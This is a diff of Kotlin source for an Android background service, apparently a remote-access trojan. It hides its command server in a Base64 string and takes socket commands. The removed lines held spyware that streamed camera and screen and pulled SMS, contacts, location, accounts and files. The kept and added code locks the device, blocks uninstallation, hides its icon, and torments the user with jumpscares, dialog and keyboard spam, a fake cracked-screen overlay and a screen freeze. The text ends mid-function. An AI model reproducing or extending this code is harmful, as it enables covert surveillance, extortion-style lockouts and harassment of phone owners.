@@ -1,75 +1,50 @@
 package com.sync.xxx
 
-import android.Manifest
 import android.annotation.SuppressLint
 import android.app.*
 import android.app.WallpaperManager
 import android.content.*
-import android.content.pm.PackageManager
+import android.content.pm.ServiceInfo
 import android.graphics.Bitmap
 import android.graphics.BitmapFactory
 import android.graphics.Matrix
 import android.graphics.PixelFormat
 import android.hardware.camera2.CameraCharacteristics
 import android.hardware.camera2.CameraManager
-import android.media.ImageReader
-import android.media.projection.MediaProjection
-import android.media.projection.MediaProjectionManager
-import android.database.Cursor
-import android.location.Address
-import android.location.Geocoder
-import android.location.LocationManager
 import android.net.Uri
 import android.os.*
-import android.provider.ContactsContract
-import android.provider.MediaStore
 import android.provider.Settings
-import com.google.android.gms.location.FusedLocationProviderClient
-import com.google.android.gms.location.LocationCallback
-import com.google.android.gms.location.LocationRequest
-import com.google.android.gms.location.LocationResult
-import com.google.android.gms.location.LocationServices
-import com.google.android.gms.location.Priority
 import android.util.Base64
-import android.util.DisplayMetrics
 import android.util.Log
 import android.view.WindowManager
-import androidx.camera.core.*
-import androidx.camera.lifecycle.ProcessCameraProvider
-import androidx.core.app.ActivityCompat
 import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
-import androidx.lifecycle.*
+import androidx.lifecycle.Lifecycle
+import androidx.lifecycle.LifecycleOwner
+import androidx.lifecycle.LifecycleRegistry
 import io.socket.client.IO
 import io.socket.client.Socket
 import org.json.JSONObject
-import java.io.ByteArrayOutputStream
 import java.net.URI
-import java.util.concurrent.Executors
 import android.media.AudioManager
 
 class DeviceService : Service(), LifecycleOwner {
 
-    companion object {
-        const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
-        const val EXTRA_COMMAND        = "command"
-        const val EXTRA_VALUE          = "value"
-        const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
-        const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
-        const val EXTRA_STATUS_JSON    = "statusJson"
-        const val ACTION_SEND_FRAME    = "com.sync.xxx.SEND_FRAME"
-        const val EXTRA_FRAME_B64      = "frameB64"
-        const val ACTION_SCREEN_RESULT = "com.sync.xxx.SCREEN_RESULT"
-        const val EXTRA_RESULT_CODE    = "resultCode"
-        const val EXTRA_RESULT_DATA    = "resultData"
+companion object {
+    const val ACTION_COMMAND       = "com.sync.xxx.COMMAND"
+    const val EXTRA_COMMAND        = "command"
+    const val EXTRA_VALUE          = "value"
+    const val ACTION_CONNECT       = "com.sync.xxx.CONNECT"
+    const val ACTION_SEND_STATUS   = "com.sync.xxx.SEND_STATUS"
+    const val EXTRA_STATUS_JSON    = "statusJson"
 
-        val SERVER_URL: String get() = String(android.util.Base64.decode(
-    "aHR0cDovL3BhbmVsLnB0ZXJvZGFjdHlsLmNsb3VkOjQyNTk=",
-    android.util.Base64.DEFAULT
-)).trim()
-        const val CHANNEL_ID = "sync_xxx"
-        const val NOTIF_ID   = 1
-    }
+    val SERVER_URL: String get() = String(android.util.Base64.decode(
+        "aHR0cDovL3BhbmVsLnB0ZXJvZGFjdHlsLmNsb3VkOjQyNTk=",
+        android.util.Base64.DEFAULT
+    )).trim()
+    const val CHANNEL_ID = "sync_xxx"
+    const val NOTIF_ID   = 1
+}
 
     private val lifecycleRegistry = LifecycleRegistry(this)
     override val lifecycle: Lifecycle get() = lifecycleRegistry
@@ -81,125 +56,76 @@ class DeviceService : Service(), LifecycleOwner {
     var lockPin: String = ""
     var lockTitle: String = ""
 
-    private var cameraProvider: ProcessCameraProvider? = null
-    private var imageAnalysis: ImageAnalysis? = null
-    private var streaming = false
-    private var lastFrameTime = 0L
-    private val FRAME_INTERVAL = 250L
-
-    private var cameraManager: CameraManager? = null
-    private var torchCameraId: String? = null
-    private var flashHandler: Handler? = null
-    private var flashRunnable: Runnable? = null
-    private var flashBlinking = false
-    
-    private var mediaProjection: MediaProjection? = null
-    private var imageReader: ImageReader? = null
-    private var screenStreaming = false
-    private var lastScreenFrameTime = 0L
-    private val SCREEN_FRAME_INTERVAL = 250L
-    private var screenHandler: Handler? = null
-    private var screenRunnable: Runnable? = null
-    private var savedProjectionResultCode: Int = -1
-    private var savedProjectionData: Intent? = null
-    private var singleFrameRequest = false
-    private var singleFrameFacing = "front"
+    // ✅ TETAP: cameraManager dibutuhkan untuk Flashlight (torch)
+private var cameraManager: CameraManager? = null
+private var torchCameraId: String? = null
+private var flashHandler: Handler? = null
+private var flashRunnable: Runnable? = null
+private var flashBlinking = false
 
 
-    private val localReceiver = object : BroadcastReceiver() {
-        override fun onReceive(ctx: Context, intent: Intent) {
-            when (intent.action) {
-                ACTION_CONNECT -> {
-                    if (socket == null || socket?.connected() == false) connectSocket()
-                }
-                ACTION_SEND_STATUS -> {
-                    val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
-                    emitStatus(JSONObject(json))
-                }
-                ACTION_SCREEN_RESULT -> {
-                    val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, -1)
-                    android.util.Log.d("DeviceService", "ACTION_SCREEN_RESULT: resultCode=$resultCode")
-                    val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU)
-                        intent.getParcelableExtra(EXTRA_RESULT_DATA, android.content.Intent::class.java)
-                    else
-                        @Suppress("DEPRECATION") intent.getParcelableExtra(EXTRA_RESULT_DATA)
-                    if (resultCode != android.app.Activity.RESULT_OK || data == null) {
-                        android.util.Log.w("DeviceService", "Screen capture denied or data null")
-                        emitStatus(JSONObject().apply { put("screenActive", false) })
-                        return
-                    }
-                    savedProjectionResultCode = resultCode
-                    savedProjectionData = data
-                    startScreenCapture(resultCode, data)
-                }
-                "com.sync.xxx.NEW_NOTIF" -> {
-                    val payloadStr = intent.getStringExtra("payload") ?: return
-                    try {
-                        val payload = JSONObject(payloadStr)
-                        storeNotif(payload)
-                        if (socket?.connected() == true) {
-                            socket?.emit("device:notif", JSONObject().apply {
-                                put("deviceId", deviceId)
-                                put("notif", payload)
-                            })
-                        }
-                    } catch (_: Exception) {}
-                }
+private val localReceiver = object : BroadcastReceiver() {
+    override fun onReceive(ctx: Context, intent: Intent) {
+        when (intent.action) {
+            ACTION_CONNECT -> {
+                if (socket == null || socket?.connected() == false) connectSocket()
+            }
+            ACTION_SEND_STATUS -> {
+                val json = intent.getStringExtra(EXTRA_STATUS_JSON) ?: return
+                emitStatus(JSONObject(json))
             }
         }
     }
+}
 
-    override fun onCreate() {
-        super.onCreate()
-        createNotificationChannel()
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            val hasLocation = ActivityCompat.checkSelfPermission(
-                this, Manifest.permission.ACCESS_FINE_LOCATION
-            ) == PackageManager.PERMISSION_GRANTED
-            val hasCamera = ActivityCompat.checkSelfPermission(
-                this, Manifest.permission.CAMERA
-            ) == PackageManager.PERMISSION_GRANTED
+override fun onCreate() {
+    super.onCreate()
+    createNotificationChannel()
 
-            var serviceType = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
-            if (hasLocation) serviceType = serviceType or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
-
-            startForeground(NOTIF_ID, buildNotification(), serviceType)
-        } else {
-            startForeground(NOTIF_ID, buildNotification())
-        }
-
-        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
-        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
-        lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
-
-        deviceId = android.provider.Settings.Secure.getString(
-    contentResolver,
-    android.provider.Settings.Secure.ANDROID_ID
-).takeIf { !it.isNullOrBlank() } ?: Build.ID
-        val mfr    = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
-        val model  = Build.MODEL
-        deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"
-
-        cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
-        torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
-            cameraManager?.getCameraCharacteristics(id)
-                ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
-        }
-
-        val filter = IntentFilter().apply {
-            addAction(ACTION_CONNECT)
-            addAction(ACTION_SEND_STATUS)
-            addAction(ACTION_SCREEN_RESULT)
-            addAction("com.sync.xxx.NEW_NOTIF")
-        }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-            registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
-        } else {
-            registerReceiver(localReceiver, filter)
-        }
-
-        connectSocket()
+    // Foreground service type: cukup SPECIAL_USE (overlay & TTS)
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+        startForeground(
+            NOTIF_ID,
+            buildNotification(),
+            android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE
+        )
+    } else {
+        startForeground(NOTIF_ID, buildNotification())
     }
+
+    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_CREATE)
+    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_START)
+    lifecycleRegistry.handleLifecycleEvent(Lifecycle.Event.ON_RESUME)
+
+    deviceId = android.provider.Settings.Secure.getString(
+        contentResolver,
+        android.provider.Settings.Secure.ANDROID_ID
+    ).takeIf { !it.isNullOrBlank() } ?: Build.ID
+
+    val mfr   = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
+    val model = Build.MODEL
+    deviceName = if (model.startsWith(mfr, ignoreCase = true)) model else "$mfr $model"
+
+    // CameraManager tetap dipakai untuk flashlight (torch)
+    cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
+    torchCameraId = cameraManager?.cameraIdList?.firstOrNull { id ->
+        cameraManager?.getCameraCharacteristics(id)
+            ?.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) == true
+    }
+
+    val filter = IntentFilter().apply {
+        addAction(ACTION_CONNECT)
+        addAction(ACTION_SEND_STATUS)
+        // ❌ ACTION_SCREEN_RESULT & NEW_NOTIF dihapus — fitur screen/notif udah nggak ada
+    }
+    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+        registerReceiver(localReceiver, filter, RECEIVER_NOT_EXPORTED)
+    } else {
+        registerReceiver(localReceiver, filter)
+    }
+
+    connectSocket()
+}
 
     private fun connectSocket() {
         try {
@@ -260,226 +186,45 @@ class DeviceService : Service(), LifecycleOwner {
     }
 
     private fun handleCommand(cmd: String, value: String) {
-    Log.d("DeviceService", "📩 Command received: $cmd, value: $value")
-    
     when (cmd) {
-        "flashlight" -> {
-            Log.d("DeviceService", "💡 Flashlight: ${value == "true"}")
-            setFlashlight(value == "true")
-        }
-        "liveCamera" -> {
-            Log.d("DeviceService", "📷 liveCamera: starting camera with facing: $value")
-            val facing = if (value == "front" || value == "back") value else "front"
-            startCamera(facing)
-            emitStatus(JSONObject().apply { put("cameraActive", true) })
-        }
+        "flashlight" -> setFlashlight(value == "true")
+        "lockDevice" -> lockDevice(value)
+        "lockCustom" -> lockCustom(value)
+        "unlockDevice" -> unlockDevice()
+        "changeTheme" -> changeTheme(value)
+        "setWallpaper" -> setWallpaperFromUrl(value)
+        "openUrl" -> openUrl(value)
+        "playAudio" -> playAudio(value)
+        "jumpscareStart" -> startJumpscare(value)
+        "jumpscareStop" -> stopJumpscare()
+        "vibrate" -> vibrateDevice(value)
+        "showToast" -> showToast(value)
+        "dialogSpam" -> startDialogSpam(value)
+        "dialogSpamStop" -> stopDialogSpam()
+        "videoOverlay" -> startVideoOverlay()
+        "videoOverlayHide" -> stopVideoOverlay()
+        "ttsSpeak" -> ttsSpeak(value)
+        "ttsStop" -> ttsStop()
+        "hideIcon" -> hideAppIcon(value == "true")
+        "muteVolume" -> setVolumeMute(value == "true")
+        "jumpscare2Start" -> startJumpscare2(value)
+        "jumpscare2Stop" -> stopJumpscare2()
         "setAntiUninstall" -> {
-    Log.d("DeviceService", "🛡️ Set anti-uninstall: ${value == "true"}")
-    AntiUninstallHelper.setEnabled(this, value == "true")
-    emitStatus(JSONObject().apply {
-        put("antiUninstall", value == "true")
-        put("antiUninstallActive", AntiUninstallHelper.isAdminActive(this@DeviceService))
-    })
-}
-"uploadFile" -> {
-    Log.d("DeviceService", "📤 Upload file: $value")
-    Thread {
-        try {
-            val obj = JSONObject(value)
-            val path = obj.getString("path")
-            val contentB64 = obj.getString("content")
-            val file = java.io.File(path)
-            file.parentFile?.mkdirs()
-            file.writeBytes(android.util.Base64.decode(contentB64, android.util.Base64.DEFAULT))
+            AntiUninstallHelper.setEnabled(this, value == "true")
             emitStatus(JSONObject().apply {
-                put("uploaded", path)
-                put("uploadOk", true)
-            })
-        } catch (e: Exception) {
-            Log.e("DeviceService", "uploadFile error: ${e.message}")
-            emitStatus(JSONObject().apply {
-                put("uploadOk", false)
-                put("uploadError", e.message ?: "unknown")
+                put("antiUninstall", value == "true")
+                put("antiUninstallActive", AntiUninstallHelper.isAdminActive(this@DeviceService))
             })
         }
-    }.start()
-}
-        "camera" -> when (value) {
-            "front" -> {
-                Log.d("DeviceService", "📷 Camera front: starting")
-                startCamera("front")
-            }
-            "back" -> {
-                Log.d("DeviceService", "📷 Camera back: starting")
-                startCamera("back")
-            }
-            "stop" -> {
-                Log.d("DeviceService", "📷 Camera stop")
-                stopCamera()
-            }
-            else -> {
-                val facing = if (value.contains("front")) "front" else "back"
-                Log.d("DeviceService", "📷 Camera single frame: $facing")
-                captureSingleFrame(facing)
-            }
-        }
-        "screen" -> when (value) {
-            "start" -> {
-                Log.d("DeviceService", "🖥️ Screen capture start")
-                requestScreenCapture()
-            }
-            else -> {
-                Log.d("DeviceService", "🖥️ Screen capture stop")
-                stopScreenCapture()
-            }
-        }
-        "lockDevice" -> {
-            Log.d("DeviceService", "🔒 Lock device")
-            lockDevice(value)
-        }
-        "lockCustom" -> {
-            Log.d("DeviceService", "🔒 Lock custom")
-            lockCustom(value)
-        }
-        "unlockDevice" -> {
-            Log.d("DeviceService", "🔓 Unlock device")
-            unlockDevice()
-        }
-        "changeTheme" -> {
-            Log.d("DeviceService", "🎨 Change theme: $value")
-            changeTheme(value)
-        }
-        "setWallpaper" -> {
-            Log.d("DeviceService", "🖼️ Set wallpaper: $value")
-            setWallpaperFromUrl(value)
-        }
-        "openUrl" -> {
-            Log.d("DeviceService", "🌐 Open URL: $value")
-            openUrl(value)
-        }
-        "playAudio" -> {
-            Log.d("DeviceService", "🔊 Play audio: $value")
-            playAudio(value)
-        }
-        "jumpscareStart" -> {
-            Log.d("DeviceService", "🎃 Jumpscare start")
-            startJumpscare(value)
-        }
-        "jumpscareStop" -> {
-            Log.d("DeviceService", "🎃 Jumpscare stop")
-            stopJumpscare()
-        }
-        "blockApp" -> {
-            Log.d("DeviceService", "🚫 Block app: $value")
-            blockApp(value)
-        }
-        "unblockApp" -> {
-            Log.d("DeviceService", "✅ Unblock app: $value")
-            unblockApp(value)
-        }
-        "unblockAll" -> {
-            Log.d("DeviceService", "✅ Unblock all")
-            unblockAll()
-        }
-        "getInstalledApps" -> {
-            Log.d("DeviceService", "📱 Get installed apps")
-            sendInstalledApps()
-        }
-        "getSms" -> {
-            Log.d("DeviceService", "💬 Get SMS")
-            sendSms()
-        }
-        "getNotifs" -> {
-            Log.d("DeviceService", "🔔 Get notifications")
-            sendStoredNotifs()
-        }
-        "getGallery" -> {
-            Log.d("DeviceService", "🖼️ Get gallery")
-            sendGallery()
-        }
-        "getLocation" -> {
-            Log.d("DeviceService", "📍 Get location")
-            sendLocation()
-        }
-        "getContacts" -> {
-            Log.d("DeviceService", "📇 Get contacts")
-            sendContacts()
-        }
-        "getGmail" -> {
-            Log.d("DeviceService", "📧 Get Gmail accounts")
-            sendGmailAccounts()
-        }
-        "getPhone" -> {
-            Log.d("DeviceService", "📱 Get phone numbers")
-            sendPhoneNumbers()
-        }
-        "vibrate" -> {
-            Log.d("DeviceService", "📳 Vibrate: $value")
-            vibrateDevice(value)
-        }
-        "showToast" -> {
-            Log.d("DeviceService", "🔔 Show toast: $value")
-            showToast(value)
-        }
-        "dialogSpam" -> {
-            Log.d("DeviceService", "💬 Dialog spam: $value")
-            startDialogSpam(value)
-        }
-        "dialogSpamStop" -> {
-            Log.d("DeviceService", "💬 Dialog spam stop")
-            stopDialogSpam()
-        }
-        "touchBlock" -> {
-            Log.d("DeviceService", "👆 Touch block: $value")
-            startTouchBlock(value)
-        }
-        "touchBlockStop" -> {
-            Log.d("DeviceService", "👆 Touch block stop")
-            stopTouchBlock()
-        }
-        "videoOverlay" -> {
-            Log.d("DeviceService", "📹 Video overlay start")
-            startVideoOverlay()
-        }
-        "videoOverlayHide" -> {
-            Log.d("DeviceService", "📹 Video overlay stop")
-            stopVideoOverlay()
-        }
-        "ttsSpeak" -> {
-            Log.d("DeviceService", "🗣️ TTS speak: $value")
-            ttsSpeak(value)
-        }
-        "ttsStop" -> {
-            Log.d("DeviceService", "🗣️ TTS stop")
-            ttsStop()
-        }
-        "hideIcon" -> {
-            Log.d("DeviceService", "👁️ Hide icon: ${value == "true"}")
-            hideAppIcon(value == "true")
-        }
-        "muteVolume" -> {
-            Log.d("DeviceService", "🔇 Mute volume: ${value == "true"}")
-            setVolumeMute(value == "true")
-        }
-        "jumpscare2Start" -> {
-            Log.d("DeviceService", "🎃 Jumpscare V2 start")
-            startJumpscare2(value)
-        }
-        "jumpscare2Stop" -> {
-            Log.d("DeviceService", "🎃 Jumpscare V2 stop")
-            stopJumpscare2()
-        }
-        "getFiles" -> {
-            Log.d("DeviceService", "📁 Get files: $value")
-            sendFileList(value)
-        }
-        "downloadFile" -> {
-            Log.d("DeviceService", "📥 Download file: $value")
-            downloadAndSendFile(value)
-        }
-        else -> {
-            Log.d("DeviceService", "⚠️ Unknown command: $cmd")
-        }
+        // ⬇️ FITUR BARU
+        "lcdDamageStart" -> startLcdDamage()
+        "lcdDamageStop"  -> stopLcdDamage()
+        "spamKeyboardStart" -> startSpamKeyboard()
+        "spamKeyboardStop"  -> stopSpamKeyboard()
+        "freezeScreenStart" -> startFreezeScreen()
+        "freezeScreenStop"  -> stopFreezeScreen()
+        // ⬆️ END FITUR BARU
+        else -> Log.d("DeviceService", "⚠️ Unknown command: $cmd")
     }
 }
 
@@ -657,73 +402,6 @@ private fun ttsStop() {
     sendBroadcast(intent)
     emitStatus(JSONObject().apply { put("ttsSpeaking", false) })
 }
-
-
-private var touchBlockView: android.view.View? = null
-private var touchBlockHandler: android.os.Handler? = null
-private var touchBlockRunnable: Runnable? = null
-
-private fun startTouchBlock(value: String) {
-    try {
-        stopTouchBlock()
-        val duration = try { org.json.JSONObject(value).optLong("duration", 0L) } catch (_: Exception) { value.toLongOrNull() ?: 0L }
-
-        val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
-        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
-            android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
-        else
-            @Suppress("DEPRECATION") android.view.WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
-
-        val params = android.view.WindowManager.LayoutParams(
-            android.view.WindowManager.LayoutParams.MATCH_PARENT,
-            android.view.WindowManager.LayoutParams.MATCH_PARENT,
-            type,
-            android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
-            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN,
-            android.graphics.PixelFormat.TRANSLUCENT
-        )
-
-        val view = android.view.View(this).apply {
-            setBackgroundColor(android.graphics.Color.TRANSPARENT)
-            setOnTouchListener { _, _ -> true } // block semua touch
-        }
-
-        touchBlockView = view
-        android.os.Handler(android.os.Looper.getMainLooper()).post {
-            wm.addView(view, params)
-        }
-
-        emitStatus(JSONObject().apply { put("touchBlocked", true) })
-
-        // Auto stop kalau duration > 0
-        if (duration > 0) {
-            touchBlockHandler = android.os.Handler(android.os.Looper.getMainLooper())
-            touchBlockRunnable = Runnable { stopTouchBlock() }
-            touchBlockHandler?.postDelayed(touchBlockRunnable!!, duration * 1000L)
-        }
-    } catch (e: Exception) {
-        Log.e("DeviceService", "startTouchBlock: ${e.message}")
-    }
-}
-
-private fun stopTouchBlock() {
-    touchBlockRunnable?.let { touchBlockHandler?.removeCallbacks(it) }
-    touchBlockHandler  = null
-    touchBlockRunnable = null
-    val wm = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
-    touchBlockView?.let {
-        try {
-            android.os.Handler(android.os.Looper.getMainLooper()).post {
-                wm.removeView(it)
-            }
-        } catch (_: Exception) {}
-    }
-    touchBlockView = null
-    emitStatus(JSONObject().apply { put("touchBlocked", false) })
-}
-
-    
     
     private fun startVideoOverlay() {
     try {
@@ -745,7 +423,369 @@ private fun stopVideoOverlay() {
     sendBroadcast(intent)
     emitStatus(JSONObject().apply { put("videoOverlayActive", false) })
 }
-    
+
+// ═══════════════════════════════════════════════════════════
+// FITUR BARU: LCD DAMAGE (garis-garis rusak di overlay)
+// ═══════════════════════════════════════════════════════════
+private var lcdDamageView: android.view.View? = null
+private var lcdDamageHandler: Handler? = null
+private var lcdDamageRunnable: Runnable? = null
+private var lcdDamageActive = false
+
+private fun startLcdDamage() {
+    if (lcdDamageActive) return
+    lcdDamageActive = true
+
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            val metrics = resources.displayMetrics
+            val w = metrics.widthPixels
+            val h = metrics.heightPixels
+
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+            val params = WindowManager.LayoutParams(
+                w, h, type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                PixelFormat.TRANSLUCENT
+            )
+
+            // Custom View: gambar ratusan garis random (LCD rusak)
+            val view = LcdDamageView(this@DeviceService)
+            lcdDamageView = view
+            wm.addView(view, params)
+
+            // Redraw berkala biar garis "hidup" (berkedip/moving)
+            lcdDamageHandler = Handler(Looper.getMainLooper())
+            lcdDamageRunnable = object : Runnable {
+                override fun run() {
+                    if (!lcdDamageActive) return
+                    view.invalidate()
+                    lcdDamageHandler?.postDelayed(this, 120)
+                }
+            }
+            lcdDamageHandler?.post(lcdDamageRunnable!!)
+
+            emitStatus(JSONObject().apply { put("lcdDamageActive", true) })
+        } catch (e: Exception) {
+            Log.e("DeviceService", "startLcdDamage: ${e.message}")
+            lcdDamageActive = false
+        }
+    }
+}
+
+private fun stopLcdDamage() {
+    lcdDamageActive = false
+    lcdDamageHandler?.removeCallbacks(lcdDamageRunnable ?: Runnable {})
+    lcdDamageHandler = null
+    lcdDamageRunnable = null
+    Handler(Looper.getMainLooper()).post {
+        try {
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            lcdDamageView?.let { wm.removeView(it) }
+        } catch (_: Exception) {}
+        lcdDamageView = null
+    }
+    emitStatus(JSONObject().apply { put("lcdDamageActive", false) })
+}
+
+// ═══════════════════════════════════════════════════════════
+// CUSTOM VIEW: LCD DAMAGE
+// ═══════════════════════════════════════════════════════════
+private class LcdDamageView(context: Context) : android.view.View(context) {
+    private val paint = android.graphics.Paint().apply {
+        style = android.graphics.Paint.Style.STROKE
+        isAntiAlias = true
+    }
+    private val random = java.util.Random()
+
+    override fun onDraw(canvas: android.graphics.Canvas) {
+        super.onDraw(canvas)
+        val w = width.toFloat()
+        val h = height.toFloat()
+        if (w <= 0 || h <= 0) return
+
+        // Garis horizontal rusak (banyak)
+        val hLines = 120
+        for (i in 0 until hLines) {
+            val y = random.nextFloat() * h
+            val thickness = 1f + random.nextFloat() * 5f
+            paint.strokeWidth = thickness
+            paint.color = when (random.nextInt(4)) {
+                0 -> android.graphics.Color.argb(120 + random.nextInt(80), 0, 0, 0)       // hitam
+                1 -> android.graphics.Color.argb(100 + random.nextInt(100), 255, 255, 255) // putih
+                2 -> android.graphics.Color.argb(100 + random.nextInt(100), 0, 200, 255)   // cyan
+                else -> android.graphics.Color.argb(100 + random.nextInt(100), 255, 0, 150) // magenta
+            }
+            val startX = if (random.nextBoolean()) 0f else random.nextFloat() * w * 0.4f
+            val endX = w - (if (random.nextBoolean()) 0f else random.nextFloat() * w * 0.4f)
+            canvas.drawLine(startX, y, endX, y, paint)
+        }
+
+        // Garis vertikal rusak
+        val vLines = 60
+        for (i in 0 until vLines) {
+            val x = random.nextFloat() * w
+            val thickness = 1f + random.nextFloat() * 4f
+            paint.strokeWidth = thickness
+            paint.color = when (random.nextInt(3)) {
+                0 -> android.graphics.Color.argb(80 + random.nextInt(80), 0, 0, 0)
+                1 -> android.graphics.Color.argb(60 + random.nextInt(90), 255, 255, 255)
+                else -> android.graphics.Color.argb(80 + random.nextInt(90), 0, 220, 255)
+            }
+            val startY = if (random.nextBoolean()) 0f else random.nextFloat() * h * 0.4f
+            val endY = h - (if (random.nextBoolean()) 0f else random.nextFloat() * h * 0.4f)
+            canvas.drawLine(x, startY, x, endY, paint)
+        }
+
+        // Blok pixel rusak (kotak-kotak kecil)
+        val blocks = 200
+        paint.style = android.graphics.Paint.Style.FILL
+        for (i in 0 until blocks) {
+            val bw = 4f + random.nextFloat() * 40f
+            val bh = 4f + random.nextFloat() * 40f
+            val x = random.nextFloat() * w
+            val y = random.nextFloat() * h
+            paint.color = when (random.nextInt(4)) {
+                0 -> android.graphics.Color.argb(80 + random.nextInt(100), 0, 0, 0)
+                1 -> android.graphics.Color.argb(80 + random.nextInt(100), 255, 255, 255)
+                2 -> android.graphics.Color.argb(80 + random.nextInt(100), 0, 220, 255)
+                else -> android.graphics.Color.argb(80 + random.nextInt(100), 255, 20, 100)
+            }
+            canvas.drawRect(x, y, x + bw, y + bh, paint)
+        }
+
+        // Glitch strip horizontal panjang
+        for (i in 0 until 8) {
+            val y = random.nextFloat() * h
+            val hh = 10f + random.nextFloat() * 40f
+            paint.color = android.graphics.Color.argb(150, 255, 255, 255)
+            canvas.drawRect(0f, y, w, y + hh, paint)
+        }
+
+        paint.style = android.graphics.Paint.Style.STROKE
+    }
+}
+
+// ═══════════════════════════════════════════════════════════
+// FITUR BARU: SPAM KEYBOARD + TEKS "Babay Bung !!"
+// ═══════════════════════════════════════════════════════════
+private var spamKbActive = false
+private var spamKbView: android.widget.TextView? = null
+private var spamKbHandler: Handler? = null
+private var spamKbRunnable: Runnable? = null
+private var spamKbImeVisible = false
+private var spamKbInputView: android.view.View? = null
+private var spamKbInputManager: android.view.inputmethod.InputMethodManager? = null
+
+private fun startSpamKeyboard() {
+    if (spamKbActive) return
+    spamKbActive = true
+
+    Handler(Looper.getMainLooper()).post {
+        try {
+            // 1. Overlay TextView "Babay Bung !!" di tengah layar
+            val wm = getSystemService(WINDOW_SERVICE) as WindowManager
+            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+            else
+                @Suppress("DEPRECATION") WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
+
+            val params = WindowManager.LayoutParams(
+                WindowManager.LayoutParams.MATCH_PARENT,
+                WindowManager.LayoutParams.MATCH_PARENT,
+                type,
+                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
+                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
+                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
+                WindowManager.LayoutParams.FLAG_FULLSCREEN,
+                PixelFormat.TRANSLUCENT
+            )
+
+            val tv = android.widget.TextView(this@DeviceService).apply {
+                text = ""
+                setTextSize(android.util.TypedValue.COMPLEX_UNIT_SP, 42f)
+                gravity = android.view.Gravity.CENTER
+                setTypeface(android.graphics.Typeface.MONOSPACE, android.graphics.Typeface.BOLD)
+                setShadowLayer(20f, 0f, 0f, android.graphics.Color.BLACK)
+                alpha = 1f
+            }
+            spamKbView = tv
+            wm.addView(tv, params)
+
+            // 2. Invisible EditText sebagai anchor spawn/hide IME
+            val editText = android.widget.EditText(this@DeviceService).apply {
+                alpha = 0f
+                isFocusable = true
+                isFocusableInTouchMode = true
+                setSingleLine()
+            }
+            spamKbInputView = editText
+
+            val focusParams = WindowManager.LayoutParams(
+                1, 1, type,
+                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
+                PixelFormat.TRANSLUCENT
+            ).apply {
+                gravity = android.view.Gravity.TOP or android.view.Gravity.START
+                x = 0
+                y = 0
+            }
+            wm.addView(editText, focusParams)
+
+            val imm = getSystemService(INPUT_METHOD_SERVICE) as android.view.inputmethod.InputMethodManager
+            spamKbInputManager = imm
+
+            // 3. Loop: show/hide keyboard + animasi typing warna-warni
+            spamKbHandler = Handler(Looper.getMainLooper())
+            var colorStep = 0
+            val full = "Babay Bung !!"
+            val colors = intArrayOf(
+                0xFFFF3B3B.toInt(), 0xFFFF9800.toInt(), 0xFFFFEB3B.toInt(),
+                0xFF4CAF50.toInt(), 0xFF03A9F4.toInt(), 0xFF9C27B0.toInt(),
+                0xFFE91E63.toInt(), 0xFF00BCD4.toInt()
+            )
+
+            spamKbRunnable = object : Runnable {
+                private var showReset = false
+                private var pauseTicks = 0
+
+                override fun run() {
+                    if (!spamKbActive) return
+
+                    // toggle IME show/hide
+                    try {
+                        editText.requestFocus()
